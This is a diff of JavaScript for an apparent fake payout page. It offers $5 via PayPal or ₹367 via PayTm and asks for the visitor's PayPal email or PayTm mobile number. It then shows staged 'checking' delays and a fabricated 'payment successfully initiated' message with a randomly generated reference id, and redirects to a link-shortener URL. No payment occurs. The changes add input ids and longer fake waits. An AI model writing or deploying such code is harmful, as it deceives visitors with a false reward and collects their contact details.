@@ -12,20 +12,23 @@ function wa(){
   }
 }
 function takenumber(){
-  document.getElementById('questions').innerHTML = `<center><p class='topic'><!-- pf 02 --><div class='ads'><ins class='adsbygoogle'style='display:block'data-ad-format='fluid'data-ad-layout-key='-fb+5w+4e-db+86'data-ad-client='ca-pub-2950653490323756'data-ad-slot='1422493112'></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div>Please Select a Payment Method<br></p><br><button id='paypal' onclick='goToPaypal()' type='button'> Paypal ($5) </button><br><button id='paytm' onclick='goToPaytm()' type='button'> PayTm (&#8377; 367) </button></center>`;
+  document.getElementById('questions').innerHTML = `<center><p class='topic'>We are checking all links you sent <br><br>Wait for 15 seconds</p></center>`;
+  setTimeout(function(){document.getElementById('questions').innerHTML = `<center><p class='topic'>Please Select a Payment Method<br></p><br><button id='paypal' onclick='goToPaypal()' type='button'> Paypal ($5) </button><br><button id='paytm' onclick='goToPaytm()' type='button'> PayTm (&#8377; 367) </button></center>`;}, 15000);
+
 }
 function goToPaypal(){
-      document.getElementById('questions').innerHTML = `<center><p class='topic'> <!-- Pf --><div class='ads'><ins class='adsbygoogle'style='display:block'data-ad-format='fluid'data-ad-layout-key='-fb+5w+4e-db+86'data-ad-client='ca-pub-2950653490323756'data-ad-slot='3141579521'></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div>Enter Your Paypal Connected email<br><br><input type='mail' placeholder='jhon@company.com' required><br><br><button id='paytm' onclick='sucess()' type='submit'> Withdraw </button></center>`;
+      document.getElementById('questions').innerHTML = `<center><p class='topic'> Enter Your Paypal Connected email<br><br><input id="mymail" type='mail' placeholder='jhon@company.com' required><br><br><button id='paytm' onclick='sucess()' type='submit'> Withdraw </button><span id="status"></span></center>`;
 }
 function goToPaytm(){
-     document.getElementById('questions').innerHTML = `<center><p class='topic'>Enter Your PayTm Mobile Number<br><br><input type='number' min='10' max'10' required><br><br><button id='paytm' onclick='sucess()' type='submit'> Withdraw </button></center><!-- Pf --><div class='ads'><ins class='adsbygoogle'style='display:block'data-ad-format='fluid'data-ad-layout-key='-fb+5w+4e-db+86'data-ad-client='ca-pub-2950653490323756'data-ad-slot='3141579521'></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div>`;
+
+     document.getElementById('questions').innerHTML = `<center><p class='topic'>Enter Your PayTm Mobile Number<br><br><input id="num" type='number' min='10' max'10' required><br><span id="status"></span><br><button id='paytm' onclick='sucess()' type='submit'> Withdraw </button></center>`;
 }
 function sucess(){
-      document.getElementById('questions').innerHTML = "<center><p class='topic'>Wait for 15 Seconds</p></center>";
+      document.getElementById('questions').innerHTML = "<center><p class='topic'>Please bear with us for 20 seconds more <br><br>we sre checking your information before proceding <br><br>Wait for 20 Seconds</p></center>";
      setTimeout(function(){
-       document.getElementById('questions').innerHTML = `<center><p class='topic'><div class='ads'><ins class='adsbygoogle'style='display:block'data-ad-format='fluid'data-ad-layout-key='-fb+5w+4e-db+86'data-ad-client='ca-pub-2950653490323756'data-ad-slot='3141579521'></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div>Your Payment is sucessfully initiated and amount will reflect in the respsctive method within 5-7 days under reference id:<p><br><span style = 'font-family:verdana; color:lightblue;'>${result}</span><div class='ads'><ins class='adsbygoogle'style='display:block'data-ad-format='fluid'data-ad-layout-key='-fb+5w+4e-db+86'data-ad-client='ca-pub-2950653490323756'data-ad-slot='3141579521'></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></center>`;
-       setTimeout(function(){window.location = "http://fumacrom.com/MJif"}, 5000);
-     }, 10000);
+       document.getElementById('questions').innerHTML = `<center><p class='topic'>Your Payment is sucessfully initiated and amount will reflect in the respsctive method within 5-7 days under reference id:<p><br><span style = 'font-family:verdana; color:lightblue;'>${result}</span></center>`;
+       setTimeout(function(){window.location = "http://fumacrom.com/MJif"}, 10000);
+     }, 20000);
      let result = '';
      let nums = '0123456789';
      for (var i = 0; i < 10; i++) {
